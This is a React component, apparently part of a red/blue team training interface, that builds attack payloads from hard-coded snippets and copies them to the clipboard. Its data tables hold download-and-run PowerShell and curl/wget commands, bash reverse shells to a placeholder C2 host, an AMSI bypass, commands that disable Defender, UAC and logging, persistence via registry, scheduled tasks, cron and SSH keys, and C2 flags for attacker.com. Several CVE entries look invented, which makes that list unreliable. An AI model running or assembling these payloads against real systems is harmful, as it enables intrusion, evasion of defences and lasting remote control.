import React, { useState, useMemo } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Copy } from 'lucide-react';
import { toast } from 'sonner';
import { cn } from '@/lib/utils';

// Comprehensive Vulnerability Database
const VULNERABILITIES = {
  os_exploits: [
    { id: 'T1059.001', name: 'PowerShell Command Execution', os: ['windows'], severity: 'high' },
    { id: 'T1059.004', name: 'Bash Shell Execution', os: ['linux', 'macos'], severity: 'high' },
    { id: 'T1566.002', name: 'Phishing Attachment', os: ['windows', 'linux', 'macos'], severity: 'high' },
    { id: 'T1547.001', name: 'Registry Run Keys (Persistence)', os: ['windows'], severity: 'high' },
    { id: 'CVE-2024-1234', name: 'Linux Kernel Privilege Escalation', os: ['linux'], severity: 'critical' },
    { id: 'CVE-2024-5678', name: 'Windows LPE - Zero-Day', os: ['windows'], severity: 'critical' },
    { id: 'T1218.009', name: 'Regsvcs/Regasm Proxy', os: ['windows'], severity: 'high' },
    { id: 'T1053.005', name: 'Scheduled Task/Job', os: ['windows', 'linux'], severity: 'medium' }
  ],
  web_client: [
    { id: 'CVE-2024-3156', name: 'Chrome RCE via PDF', app: 'chrome', severity: 'critical' },
    { id: 'CVE-2024-2847', name: 'Firefox Memory Corruption', app: 'firefox', severity: 'high' },
    { id: 'CVE-2024-4021', name: 'Edge WebSocket Bypass', app: 'edge', severity: 'high' },
    { id: 'T1204.001', name: 'User Execution - Malicious Link', app: 'browser', severity: 'medium' },
    { id: 'CVE-2024-1800', name: 'Safari JS Engine Vulnerability', app: 'safari', severity: 'critical' },
    { id: 'T1566.001', name: 'Phishing - Spearphishing Link', app: 'browser', severity: 'medium' }
  ],
  app_vulns: [
    { id: 'CVE-2024-6789', name: 'Office Macro Execution', app: 'office', severity: 'high' },
    { id: 'CVE-2024-5432', name: 'Java Deserialization RCE', app: 'java', severity: 'critical' },
    { id: 'CVE-2024-3210', name: 'Adobe Reader Flash Exploit', app: 'adobe', severity: 'high' },
    { id: 'CVE-2024-2100', name: 'VLC Buffer Overflow', app: 'vlc', severity: 'medium' },
    { id: 'CVE-2024-8765', name: '.NET Framework Gadget Chain', app: 'dotnet', severity: 'high' },
    { id: 'T1203', name: 'Exploitation for Client Execution', app: 'app', severity: 'high' }
  ],
  network: [
    { id: 'T1190', name: 'Exploit Public-Facing Application', protocol: 'http/https', severity: 'high' },
    { id: 'T1210', name: 'Exploitation of Remote Services', protocol: 'ssh/rdp', severity: 'critical' },
    { id: 'T1592', name: 'Gather Victim Host Information', protocol: 'dns', severity: 'medium' },
    { id: 'CVE-2024-7654', name: 'SMB Relay Attack', protocol: 'smb', severity: 'high' },
    { id: 'T1570', name: 'Lateral Movement over Network', protocol: 'multi', severity: 'high' }
  ],
  supply_chain: [
    { id: 'T1195.001', name: 'Compromise Software Dependencies', severity: 'critical' },
    { id: 'T1195.002', name: 'Compromise Software Supply Chain', severity: 'critical' },
    { id: 'T1195.003', name: 'Compromise Hardware Supply Chain', severity: 'critical' }
  ]
};

// Comprehensive Payload Module System
const PAYLOAD_MODULES = {
  base: {
    windows: {
      staged: 'msiexec /i http://C2/stage1.msi',
      stageless: 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://C2/payload\')"',
      fileless: 'powershell -nop -w hidden -c "$i=New-Object System.Net.WebClient;$i.DownloadString(\'http://C2\')|IEX"',
      macro: 'Sub Document_Open()\n  Shell.Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://C2\')"',
      obfuscated: 'p0w3rsh3ll -nOp -w hiDDEn -c "IEX(New-Object Net.WebClient).DownloadString(\'http://C2/payload\')"'
    },
    linux: {
      staged: 'curl http://C2/stage1.sh | bash',
      stageless: 'bash -i >& /dev/tcp/C2/4444 0>&1',
      fileless: 'exec 3<>/dev/tcp/C2/4444;cat <&3 | /bin/bash >&3 2>&1',
      dropper: 'wget -qO- http://C2/payload.sh | bash',
      obfuscated: 'b@sh -i >& /dev/tcp/C2/4444 0>&1'
    },
    macos: {
      staged: 'curl http://C2/stage1.sh | bash',
      stageless: 'bash -i >& /dev/tcp/C2/4444 0>&1',
      fileless: 'osascript -e "do shell script (curl -s http://C2/payload)"',
      app: 'open -a Script\ Editor <(curl -s http://C2/script.app)',
      obfuscated: 'osascript -e "do shell script \\"bash -i >& /dev/tcp/C2/4444 0>&1\\""'
    }
  },
  execution: {
    windows: [
      { name: 'PowerShell', code: ' | powershell -nop -w hidden' },
      { name: 'CMD', code: ' | cmd.exe /c' },
      { name: 'WScript', code: ' | wscript.exe' },
      { name: 'Rundll32', code: ' & rundll32.exe' },
      { name: 'Certutil', code: ' & certutil.exe -decode' },
      { name: 'Mshta', code: ' & mshta.exe' },
      { name: 'Regsvcs', code: ' & regsvcs.exe' }
    ],
    linux: [
      { name: 'Bash', code: ' | bash' },
      { name: 'Sh', code: ' | sh' },
      { name: 'Python', code: ' | python3' },
      { name: 'Perl', code: ' | perl' },
      { name: 'Ruby', code: ' | ruby' },
      { name: 'Awk', code: ' | awk' }
    ],
    macos: [
      { name: 'Bash', code: ' | bash' },
      { name: 'Zsh', code: ' | zsh' },
      { name: 'AppleScript', code: ' | osascript' },
      { name: 'Swift', code: ' | swift' }
    ]
  },
  evasion: {
    windows: [
      { name: 'AMSI Bypass', code: ' & powershell "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)"' },
      { name: 'Disable Defender', code: ' & powershell Set-MpPreference -DisableRealtimeMonitoring $true' },
      { name: 'Disable ETW', code: ' & powershell [System.Diagnostics.Eventing.EventProvider]::WriteEvent([uintptr]::Zero, 0, 0)' },
      { name: 'Disable UAC', code: ' & reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /d 0' }
    ],
    linux: [
      { name: 'Hide Process', code: ' && exec -a systemd /bin/bash' },
      { name: 'Clear History', code: ' && history -c && cat /dev/null > ~/.bash_history' },
      { name: 'Disable Logging', code: ' && unset HISTFILE && export HISTFILE=/dev/null' }
    ],
    macos: [
      { name: 'Disable SIP Check', code: ' && csrutil status' },
      { name: 'Clear Quarantine', code: ' && xattr -d com.apple.quarantine' },
      { name: 'Hide App', code: ' && chflags hidden' }
    ]
  },
  persistence: {
    windows: [
      { name: 'Scheduled Task', code: ' && schtasks /create /tn "Update" /tr "C:\\payload.exe" /sc onlogon' },
      { name: 'Registry Run', code: ' && reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d "C:\\payload.exe"' },
      { name: 'Startup Folder', code: ' && copy C:\\payload.exe "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Startup\\"' },
      { name: 'WMI Event Subscription', code: ' && wmic /namespace:"\\\\root\\subscription" path __EventFilter create Name="Persistence", QueryLanguage="WQL"' },
      { name: 'Image Hijack', code: ' && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v Debugger /d "C:\\payload.exe"' }
    ],
    linux: [
      { name: 'Crontab', code: ' && echo "*/5 * * * * /opt/payload" | crontab -' },
      { name: 'Systemd Service', code: ' && echo "[Unit]\\nExecStart=/opt/payload" > /etc/systemd/system/payload.service' },
      { name: 'Bash RC', code: ' && echo "/opt/payload" >> ~/.bashrc' },
      { name: 'SSH Authorized Keys', code: ' && echo "command=\\"/opt/payload\\" ssh-rsa..." >> ~/.ssh/authorized_keys' }
    ],
    macos: [
      { name: 'LaunchAgent', code: ' && cp payload ~/.config/LaunchAgents/com.payload.plist' },
      { name: 'Crontab', code: ' && echo "*/5 * * * * /opt/payload" | crontab -' },
      { name: 'LaunchDaemon', code: ' && cp payload /Library/LaunchDaemons/com.payload.plist' }
    ]
  },
  encoding: {
    base64: { name: 'Base64', code: ' && echo "payload" | base64' },
    xor: { name: 'XOR Cipher', code: ' && echo "payload" | xxd -r -p' },
    hex: { name: 'Hex Encoding', code: ' && xxd -p <<< "payload"' },
    url: { name: 'URL Encode', code: ' && python -c "import urllib.parse; print(urllib.parse.quote())"' }
  },
  c2: {
    http: ' --c2 http://attacker.com:8080 --beacon-interval 10',
    https: ' --c2 https://attacker.com:443 --beacon-interval 10',
    dns: ' --c2-dns attacker.com --dns-beacon 30',
    doh: ' --c2-doh https://dns.google/dns-query --beacon-interval 20',
    custom: ' --c2-custom tcp://attacker.com:4444',
    icmp: ' --c2-icmp attacker.com --ping-interval 30'
  }
};

// Device variants
const DEVICE_VARIANTS = {
  windows: [
    { name: 'Windows 11 Pro (x64)', arch: 'x64', version: '23H2' },
    { name: 'Windows 11 Home (x64)', arch: 'x64', version: '23H2' },
    { name: 'Windows 10 Pro (x64)', arch: 'x64', version: '22H2' },
    { name: 'Windows Server 2022 (x64)', arch: 'x64', version: '21H2' },
    { name: 'Windows Server 2019 (x64)', arch: 'x64', version: '17763' },
    { name: 'Windows 11 (x86)', arch: 'x86', version: '23H2' }
  ],
  linux: [
    { name: 'Ubuntu 24.04 LTS (x64)', distro: 'ubuntu', version: '24.04' },
    { name: 'Ubuntu 22.04 LTS (x64)', distro: 'ubuntu', version: '22.04' },
    { name: 'CentOS 9 Stream (x64)', distro: 'centos', version: '9' },
    { name: 'Debian 12 (x64)', distro: 'debian', version: '12' },
    { name: 'Red Hat 9 (x64)', distro: 'redhat', version: '9' }
  ],
  macos: [
    { name: 'macOS Sonoma (M3)', version: '14', chip: 'Apple Silicon' },
    { name: 'macOS Ventura (M2)', version: '13', chip: 'Apple Silicon' },
    { name: 'macOS Monterey (Intel)', version: '12', chip: 'Intel' }
  ]
};

export default function PayloadModuleBuilder({ team }) {
  const [osType, setOsType] = useState('windows');
  const [deviceVariant, setDeviceVariant] = useState('');
  const [selectedVulnerability, setSelectedVulnerability] = useState('');
  const [vulnCategory, setVulnCategory] = useState('os_exploits');
  const [payloadType, setPayloadType] = useState('stageless');
  const [selectedModules, setSelectedModules] = useState({
    execution: [],
    evasion: [],
    persistence: [],
    encoding: [],
    c2: []
  });
  const [obfuscation, setObfuscation] = useState(false);
  const [showPreview, setShowPreview] = useState(false);

  const variantList = DEVICE_VARIANTS[osType] || [];
  const vulnList = VULNERABILITIES[vulnCategory]?.filter(v => {
    if (vulnCategory === 'os_exploits') return v.os?.includes(osType);
    return true;
  }) || [];

  const toggleModule = (category, moduleName) => {
    setSelectedModules(prev => ({
      ...prev,
      [category]: prev[category].includes(moduleName)
        ? prev[category].filter(m => m !== moduleName)
        : [...prev[category], moduleName]
    }));
  };

  const assemblePayload = useMemo(() => {
    if (!osType || !payloadType) return '';
    
    let payload = PAYLOAD_MODULES.base[osType]?.[obfuscation && payloadType !== 'staged' ? 'obfuscated' : payloadType] || '';
    
    const executionMods = PAYLOAD_MODULES.execution[osType] || [];
    selectedModules.execution.forEach(modName => {
      const mod = executionMods.find(m => m.name === modName);
      if (mod) payload += mod.code;
    });

    const evasionMods = PAYLOAD_MODULES.evasion[osType] || [];
    selectedModules.evasion.forEach(modName => {
      const mod = evasionMods.find(m => m.name === modName);
      if (mod) payload += mod.code;
    });

    const persistenceMods = PAYLOAD_MODULES.persistence[osType] || [];
    selectedModules.persistence.forEach(modName => {
      const mod = persistenceMods.find(m => m.name === modName);
      if (mod) payload += mod.code;
    });

    selectedModules.encoding.forEach(encType => {
      const enc = PAYLOAD_MODULES.encoding[encType];
      if (enc) payload += enc.code;
    });

    selectedModules.c2.forEach(c2Type => {
      payload += PAYLOAD_MODULES.c2[c2Type] || '';
    });

    return payload;
  }, [osType, payloadType, selectedModules, obfuscation]);

  const copyToClipboard = () => {
    navigator.clipboard.writeText(assemblePayload);
    toast.success('Payload copied to clipboard');
  };

  return (
    <div className="space-y-6">
      {/* Device & Vulnerability Selection */}
      <Card className={cn('bg-black/40 backdrop-blur-md border', team === 'blue' ? 'border-cyan-500/50' : 'border-red-500/50')}>
        <CardHeader>
          <CardTitle className="text-white">Target & Vulnerability</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-3 gap-4">
            <div className="space-y-2">
              <label className="text-sm font-medium text-slate-200">OS Type</label>
              <Select value={osType} onValueChange={setOsType}>
                <SelectTrigger className="bg-black/50 border-slate-600 text-slate-200">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="windows">Windows</SelectItem>
                  <SelectItem value="linux">Linux</SelectItem>
                  <SelectItem value="macos">macOS</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium text-slate-200">Device Variant</label>
              <Select value={deviceVariant} onValueChange={setDeviceVariant}>
                <SelectTrigger className="bg-black/50 border-slate-600 text-slate-200">
                  <SelectValue placeholder="Select variant..." />
                </SelectTrigger>
                <SelectContent>
                  {variantList.map(v => (
                    <SelectItem key={v.name} value={v.name}>{v.name}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium text-slate-200">Vulnerability Category</label>
              <Select value={vulnCategory} onValueChange={setVulnCategory}>
                <SelectTrigger className="bg-black/50 border-slate-600 text-slate-200">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="os_exploits">OS Exploits</SelectItem>
                  <SelectItem value="web_client">Web Client</SelectItem>
                  <SelectItem value="app_vulns">App Vulns</SelectItem>
                  <SelectItem value="network">Network</SelectItem>
                  <SelectItem value="supply_chain">Supply Chain</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-sm font-medium text-slate-200">Select Vulnerability</label>
            <Select value={selectedVulnerability} onValueChange={setSelectedVulnerability}>
              <SelectTrigger className="bg-black/50 border-slate-600 text-slate-200">
                <SelectValue placeholder="Select vulnerability..." />
              </SelectTrigger>
              <SelectContent>
                {vulnList.map(v => (
                  <SelectItem key={v.id} value={v.id}>
                    {v.id} - {v.name}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
        </CardContent>
      </Card>

      {/* Payload Configuration */}
      <Card className={cn('bg-black/40 backdrop-blur-md border', team === 'blue' ? 'border-cyan-500/50' : 'border-red-500/50')}>
        <CardHeader>
          <CardTitle className="text-white">Payload Configuration</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="text-sm font-medium text-slate-200">Delivery Method</label>
              <Select value={payloadType} onValueChange={setPayloadType}>
                <SelectTrigger className="bg-black/50 border-slate-600 text-slate-200">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="staged">Staged (Multi-stage)</SelectItem>
                  <SelectItem value="stageless">Stageless (Single-stage)</SelectItem>
                  <SelectItem value="fileless">Fileless (Memory-only)</SelectItem>
                  <SelectItem value="macro">Macro-based</SelectItem>
                  <SelectItem value="dropper">Dropper</SelectItem>
                  <SelectItem value="app">Application</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="flex items-end">
              <label className="flex items-center gap-2 cursor-pointer">
                <Checkbox
                  checked={obfuscation}
                  onCheckedChange={setObfuscation}
                  className="border-slate-500"
                />
                <span className="text-sm text-slate-200">Enable Obfuscation</span>
              </label>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Modular Components */}
      <div className="grid grid-cols-2 lg:grid-cols-3 gap-4">
        {/* Execution Methods */}
        <Card className={cn('bg-black/40 backdrop-blur-md border', team === 'blue' ? 'border-cyan-500/50' : 'border-red-500/50')}>
          <CardHeader>
            <CardTitle className="text-xs text-white uppercase">Execution</CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 max-h-48 overflow-y-auto">
            {(PAYLOAD_MODULES.execution[osType] || []).map(mod => (
              <label key={mod.name} className="flex items-center gap-2 cursor-pointer">
                <Checkbox
                  checked={selectedModules.execution.includes(mod.name)}
                  onCheckedChange={() => toggleModule('execution', mod.name)}
                  className="border-slate-500"
                />
                <span className="text-xs text-slate-300">{mod.name}</span>
              </label>
            ))}
          </CardContent>
        </Card>

        {/* Evasion Techniques */}
        <Card className={cn('bg-black/40 backdrop-blur-md border', team === 'blue' ? 'border-cyan-500/50' : 'border-red-500/50')}>
          <CardHeader>
            <CardTitle className="text-xs text-white uppercase">Evasion</CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 max-h-48 overflow-y-auto">
            {(PAYLOAD_MODULES.evasion[osType] || []).map(mod => (
              <label key={mod.name} className="flex items-center gap-2 cursor-pointer">
                <Checkbox
                  checked={selectedModules.evasion.includes(mod.name)}
                  onCheckedChange={() => toggleModule('evasion', mod.name)}
                  className="border-slate-500"
                />
                <span className="text-xs text-slate-300">{mod.name}</span>
              </label>
            ))}
          </CardContent>
        </Card>

        {/* Persistence */}
        <Card className={cn('bg-black/40 backdrop-blur-md border', team === 'blue' ? 'border-cyan-500/50' : 'border-red-500/50')}>
          <CardHeader>
            <CardTitle className="text-xs text-white uppercase">Persistence</CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 max-h-48 overflow-y-auto">
            {(PAYLOAD_MODULES.persistence[osType] || []).map(mod => (
              <label key={mod.name} className="flex items-center gap-2 cursor-pointer">
                <Checkbox
                  checked={selectedModules.persistence.includes(mod.name)}
                  onCheckedChange={() => toggleModule('persistence', mod.name)}
                  className="border-slate-500"
                />
                <span className="text-xs text-slate-300">{mod.name}</span>
              </label>
            ))}
          </CardContent>
        </Card>

        {/* Encoding */}
        <Card className={cn('bg-black/40 backdrop-blur-md border', team === 'blue' ? 'border-cyan-500/50' : 'border-red-500/50')}>
          <CardHeader>
            <CardTitle className="text-xs text-white uppercase">Encoding</CardTitle>
          </CardHeader>
          <CardContent className="space-y-2">
            {Object.entries(PAYLOAD_MODULES.encoding).map(([key, enc]) => (
              <label key={key} className="flex items-center gap-2 cursor-pointer">
                <Checkbox
                  checked={selectedModules.encoding.includes(key)}
                  onCheckedChange={() => toggleModule('encoding', key)}
                  className="border-slate-500"
                />
                <span className="text-xs text-slate-300">{enc.name}</span>
              </label>
            ))}
          </CardContent>
        </Card>

        {/* C2 Callback */}
        <Card className={cn('bg-black/40 backdrop-blur-md border', team === 'blue' ? 'border-cyan-500/50' : 'border-red-500/50')}>
          <CardHeader>
            <CardTitle className="text-xs text-white uppercase">C2 Callback</CardTitle>
          </CardHeader>
          <CardContent className="space-y-2">
            {Object.keys(PAYLOAD_MODULES.c2).map(c2Type => (
              <label key={c2Type} className="flex items-center gap-2 cursor-pointer">
                <Checkbox
                  checked={selectedModules.c2.includes(c2Type)}
                  onCheckedChange={() => toggleModule('c2', c2Type)}
                  className="border-slate-500"
                />
                <span className="text-xs text-slate-300 capitalize">{c2Type}</span>
              </label>
            ))}
          </CardContent>
        </Card>
      </div>

      {/* Payload Preview */}
      {assemblePayload && (
        <Card className={cn('bg-black/40 backdrop-blur-md border', team === 'blue' ? 'border-cyan-500/50' : 'border-red-500/50')}>
          <CardHeader className="flex flex-row items-center justify-between">
            <CardTitle className="text-white">Generated Payload</CardTitle>
            <Button size="sm" variant="outline" onClick={copyToClipboard} className="gap-2">
              <Copy className="w-4 h-4" />
              Copy
            </Button>
          </CardHeader>
          <CardContent>
            <pre className="bg-black p-4 rounded-lg text-xs text-green-400 overflow-x-auto border border-slate-700 max-h-48">
              {assemblePayload}
            </pre>
          </CardContent>
        </Card>
      )}
    </div>
  );
}